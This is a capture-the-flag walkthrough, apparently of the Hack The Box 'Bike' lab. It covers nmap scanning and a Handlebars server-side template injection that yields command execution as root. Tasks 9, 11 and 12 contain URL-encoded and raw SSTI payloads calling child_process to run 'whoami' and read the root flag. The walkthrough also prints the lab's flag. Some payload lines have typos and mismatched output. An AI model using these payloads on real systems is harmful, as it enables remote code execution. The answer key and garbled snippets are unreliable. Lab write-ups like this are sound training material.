#### Task 1: What TCP ports does nmap identify as open? Answer with a list of ports seperated by commas with no spaces, from low to high.
Command:
```html
nmap -sC 10.129.97.64
```
Output:
```html
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http
|_http-title:  Bike 
```
Answer: **22**,**80**

#### Task 2: What software is running the service listening on the http/web port identified in the first question?
Command:
```html
nmap -sV -sC -A 10.129.97.64
```
Output:
```html
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Node.js (Express middleware)
|_http-title:  Bike 
```
Answer: **Node.js**

#### Task 3: What is the name of the Web Framework according to Wappalyzer?
<img width="257" height="311" alt="image" src="https://github.com/user-attachments/assets/fcb3b69a-dab0-4b37-bd52-878843a7609e" />

Answer: **Express**

#### Task 4: What software is running the service listening on the http/web port identified in the first question?
Command:
```html
nmap -sV -sC -A 10.129.97.64
```
Output:
```html
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Node.js (Express middleware)
|_http-title:  Bike 
```
Answer: **Node.js**

#### Task 5: What is the name of the vulnerability we test for by submitting {{7*7}}?

Answer: **Server Side Template Injection**

#### Task 6: What is the templating engine being used within Node.JS?
after pasting {{7*7}} into the e-mail field, the page returns an error:
```html
"{{7*7}}"
2	"--^"
3	"Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID'"
4	"    at Parser.parseError (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:2
```
from this error you can read what engine is running on the web application
Answer: **handlebars**

#### Task 7: What is the name of the BurpSuite tab used to encode text?

Answer: **decoder**



#### Task 8: In order to send special characters in our payload in an HTTP request, we'll encode the payload. What type of encoding do we use?

Answer: **URL**

#### Task 9: When we use a payload from HackTricks to try to run system commands, we get an error back. What is "not defined" in the response error?
Command:
```html
email=%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27whoami%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D
&action=Submit
```
Output:
```html
"ReferenceError: require is not defined" 
```
Answer: **require**

#### Task 10: What variable is the name of the top-level scope in Node.JS?

Answer: **global**

#### Task 11: By exploiting this vulnerability, we get command execution as the user that the webserver is running as. What is the name of that user?
Command:
```html
{{this.push “return process.mainModulerequire(‘child_process’).execSyn(‘whoami’);”}}
```
Output:
```html
root
```

Answer: **root**

#### Task 12: Submit root flag
Command:
```html
{{this.push “return process.mainModulerequire(‘child_process’).execS(‘cat /root/flag.txt’);”}}
```
Output:
```html
root
```

Answer: **6b258d726d287462d60c103d0142a81c**






